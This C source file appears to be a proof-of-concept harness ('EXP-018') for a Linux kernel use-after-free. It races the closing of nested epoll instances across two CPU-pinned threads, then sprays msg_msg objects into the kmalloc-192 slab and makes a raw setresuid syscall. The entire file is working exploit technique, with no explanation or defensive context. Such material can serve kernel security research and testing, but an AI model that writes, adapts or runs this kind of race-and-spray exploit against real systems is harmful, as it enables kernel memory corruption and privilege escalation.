#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sched.h>
#include <unistd.h>
#include <sys/epoll.h>
#include <pthread.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <string.h>

int ep_outer, ep_inner;
int pipefd[2];
int msgq_id;

struct msg_struct {
    long mtype;
    char mtext[144]; // 144 bytes user data -> kmalloc-192
};

volatile int state = 0;

void *thread_a(void *arg) {
    // Pin to CPU 0
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    state = 1;
    close(ep_outer);
    return NULL;
}

void *thread_b(void *arg) {
    // Pin to CPU 1
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(1, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    while (state == 0) {
        // Spin
    }
    // Thread A has started closing. Wait for it to hit Breakpoint 1.
    usleep(100000); // 100ms
    close(ep_inner); // This will trigger ep_free
    
    // SPRAY immediately on the same thread (same CPU)
    struct msg_struct msg;
    msg.mtype = 1;
    memset(msg.mtext, 0x41, sizeof(msg.mtext)); // 0x41414141...
    
    printf("[*] Thread B starting msgsnd loop...\n");
    for (int i = 0; i < 5000; i++) {
        if (msgsnd(msgq_id, &msg, sizeof(msg.mtext), IPC_NOWAIT) < 0) {
            break;
        }
    }
    printf("[*] Spray complete.\n");
    syscall(147, 1337, 1337, 1337); // SYS_setresuid on arm64 is 147
    return NULL;
}

int main() {
    printf("[*] Starting EXP-018 harness...\n");
    
    msgq_id = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (msgq_id == -1) {
        perror("msgget");
        return 1;
    }

    pipe(pipefd);

    state = 0;
    ep_outer = epoll_create1(0);
    ep_inner = epoll_create1(0);
    
    struct epoll_event ev;
    ev.events = EPOLLIN;
    ev.data.fd = ep_inner;
    epoll_ctl(ep_outer, EPOLL_CTL_ADD, ep_inner, &ev);
    
    pthread_t ta, tb;
    pthread_create(&ta, NULL, thread_a, NULL);
    pthread_create(&tb, NULL, thread_b, NULL);
    
    pthread_join(ta, NULL);
    pthread_join(tb, NULL);
    
    printf("[*] Done.\n");
    return 0;
}
